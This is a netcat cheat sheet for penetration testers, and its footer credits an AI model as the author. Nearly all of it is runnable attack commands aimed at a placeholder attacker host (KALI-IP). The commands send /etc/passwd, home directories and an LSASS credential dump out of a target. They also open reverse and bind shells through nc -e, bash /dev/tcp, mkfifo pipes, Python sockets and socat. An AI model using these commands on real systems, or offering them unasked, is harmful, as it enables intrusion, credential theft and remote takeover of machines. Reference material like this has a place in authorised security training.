# Netcat (nc)

**Tags:** `#netcat` `#nc` `#filetransfer` `#exfil` `#linux` `#windows` `#tcp` `#shells`

TCP/UDP Swiss army knife — raw socket connections for file transfer, bind/reverse shells, port scanning, and relaying. For file transfer specifically: the universal last-resort method when no other tools are available. Available as `nc`, `ncat` (Nmap's version), and `netcat` on Linux; `ncat.exe` on Windows.

**Source:** Pre-installed on Kali (`ncat` via nmap, `netcat-openbsd`)
**Windows:** Download `ncat.exe` from Nmap release package

```bash
# Listener (receiver)
nc -lvnp 9001 > received_file

# Sender
nc ATTACKER 9001 < file_to_send
```

---

## File Transfer — Linux

```bash
# Kali (receiver) — listen and write to file
nc -lvnp 9001 > tool.exe

# Target (sender) — connect and stream file
nc KALI-IP 9001 < /etc/passwd

# With progress (pv)
nc -lvnp 9001 | pv > largefile.zip
pv largefile.zip | nc KALI-IP 9001

# Compress on the fly
nc -lvnp 9001 | gunzip > archive.tar
tar czf - /home/user | nc KALI-IP 9001

# Transfer directory (tar + nc)
# Kali receiver:
nc -lvnp 9001 | tar xzf -
# Target sender:
tar czf - /home/user/documents | nc KALI-IP 9001
```

---

## File Transfer — Windows (ncat.exe)

```cmd
:: Kali receiver
nc -lvnp 9001 > tool.exe

:: Windows sender — push file to Kali
ncat.exe KALI-IP 9001 < C:\Windows\Temp\lsass.dmp

:: Windows receiver — pull from Kali (reverse: Kali sends)
:: Kali sender:
nc -lvnp 9001 < tool.exe
:: Windows:
ncat.exe KALI-IP 9001 > C:\Windows\Temp\tool.exe
```

---

## Reverse Shells

```bash
# Linux reverse shell — target connects back to Kali
# Kali listener:
nc -lvnp 4444

# Target:
nc KALI-IP 4444 -e /bin/bash         # GNU netcat
bash -i >& /dev/tcp/KALI-IP/4444 0>&1  # bash built-in (no nc needed)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc KALI-IP 4444 >/tmp/f  # no -e version
```

```cmd
:: Windows reverse shell
ncat.exe KALI-IP 4444 -e cmd.exe
ncat.exe KALI-IP 4444 -e powershell.exe
```

---

## Bind Shells

```bash
# Linux bind shell — Kali connects TO target
# Target (binds shell on port 4444):
nc -lvnp 4444 -e /bin/bash

# Kali connects:
nc TARGET-IP 4444
```

```cmd
:: Windows bind shell
ncat.exe -lvnp 4444 -e cmd.exe
```

---

## Port Scanning (Quick)

```bash
# Basic port scan (no -z on ncat — use nc or nmap instead)
nc -zv 192.168.1.10 1-1000 2>&1 | grep succeeded

# Check single port
nc -zv 192.168.1.10 445
```

---

## Relay / Pivot

```bash
# Relay traffic from port 8080 to internal host:80 (requires mkfifo)
mkfifo /tmp/relay
nc -lvnp 8080 < /tmp/relay | nc 10.10.10.5 80 > /tmp/relay
```

---

## Useful Flags

| Flag | Description |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p <port>` | Port |
| `-e <cmd>` | Execute command on connect (GNU netcat) |
| `-k` | Keep listening after connection closes (ncat) |
| `-w <sec>` | Timeout |
| `-z` | Zero-I/O mode (port scan — nc only) |
| `-u` | UDP mode |
| `--ssl` | SSL/TLS (ncat only) |

---

## When nc Is Not Available (Linux)

```bash
# bash TCP built-in (no nc needed)
bash -i >& /dev/tcp/KALI-IP/4444 0>&1

# /dev/tcp file transfer
# Kali receiver:
nc -lvnp 9001 > file.txt
# Target (bash):
cat /etc/passwd > /dev/tcp/KALI-IP/9001

# Python socket
python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('KALI-IP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])"

# socat (if installed)
socat TCP:KALI-IP:4444 EXEC:/bin/bash
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
